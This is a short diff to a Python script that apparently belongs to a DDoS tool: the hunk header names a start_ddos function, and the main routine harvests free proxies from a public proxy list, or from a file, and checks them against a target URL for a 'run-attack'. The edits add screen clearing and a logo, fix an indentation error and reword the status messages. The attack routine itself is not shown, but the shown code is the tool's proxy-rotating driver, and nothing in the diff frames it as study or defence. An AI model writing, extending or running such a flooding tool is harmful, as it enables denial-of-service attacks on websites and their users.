@@ -75,7 +75,8 @@ def start_ddos(prox, url, headers, proxies, color):
 @click.option('--proxy', '-p', help="File with a proxy")
 @click.option('--url', '-u', help="URL")
 def main(proxy, url):
-	
+	clear()
+	logo()
 	if url == None:
 		url = input("URL: ")
 	if url[:4] != "http":
@@ -85,13 +86,13 @@ def main(proxy, url):
 		while True:
 			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
 			array = req.text.split()
-			print(Back.YELLOW+Fore.WHITE+"Shiffin Run-Attack Found {} new proxies".format(len(array))+Style.RESET_ALL)
-		    check_prox(array, url)
+			print(Back.YELLOW+Fore.WHITE+"Shiffin run-attack Found {} new proxies".format(len(array))+Style.RESET_ALL)
+			check_prox(array, url)
 	else:
 		try:
 			fx = open(proxy)
 			array = fx.read().split()
-			print(Back.YELLOW+Fore.WHITE+"Shiffin Run-Attack Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
+			print("Shiffin run-attack Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
 			check_prox(array, url)
 		except FileNotFoundError:
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
